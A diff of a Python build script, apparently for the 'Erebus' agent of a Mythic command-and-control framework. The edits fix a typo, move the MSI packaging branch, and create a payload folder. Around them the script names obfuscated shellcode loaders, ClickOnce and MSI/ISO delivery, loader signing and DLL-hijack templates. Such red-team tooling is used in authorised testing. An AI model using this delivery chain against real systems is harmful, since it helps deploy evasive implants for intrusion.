@@ -537,7 +537,7 @@ generated if none have been entered.""",
         BuildStep(step_name = "Compiling Shellcode Loader",
             step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),
 
-        BuildStep(step_name = "Compiling ClickOnce Loader`",
+        BuildStep(step_name = "Compiling ClickOnce Loader",
             step_description = "Compiling ClickOnce Loader with Obfuscated Raw Agent Shellcode"),
 
         BuildStep(step_name = "Sign Shellcode Loader",
@@ -579,14 +579,6 @@ generated if none have been entered.""",
                         MythicRPCFileGetContentMessage(AgentFileId=iso_uuid)
                     )
 
-            case "MSI":
-                return build_msi(
-                    build_path=Path(self.agent_build_path),
-                    app_name=self.get_parameter("5.1 MSI Product Name"),
-                    manufacturer=self.get_parameter("5.2 MSI Manufacturer"),
-                    install_scope=self.get_parameter("5.3 MSI Install Scope")
-                )
-
                 filename = f"template_{iso_uuid}.iso"
                 temp_dir = Path(tempfile.gettempdir())
                 source_iso_path = temp_dir / filename
@@ -597,6 +589,15 @@ generated if none have been entered.""",
                                     source_iso=source_iso_path,
                                     build_path=Path(self.agent_build_path)
                                 )
+
+            case "MSI":
+                return build_msi(
+                    build_path=Path(self.agent_build_path),
+                    app_name=self.get_parameter("5.1 MSI Product Name"),
+                    manufacturer=self.get_parameter("5.2 MSI Manufacturer"),
+                    install_scope=self.get_parameter("5.3 MSI Install Scope")
+                )
+
         return None
 
     def create_triggers(self):
@@ -626,7 +627,7 @@ generated if none have been entered.""",
 
             obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
             obfuscated_shellcode_path = str(obfuscated_shellcode_path)
-
+            
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
             encryption_key_path_cpp = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "key.hpp"
@@ -647,6 +648,8 @@ generated if none have been entered.""",
             dll_hijack_template_path = str(dll_hijack_template_path)
             dll_target_path = str(dll_target_path)
             dll_exports_path = str(dll_exports_path)
+
+            os.mkdir(path=Path(agent_build_path) / "payload")
 
             environment = Environment(loader=FileSystemLoader(templates_path))
 
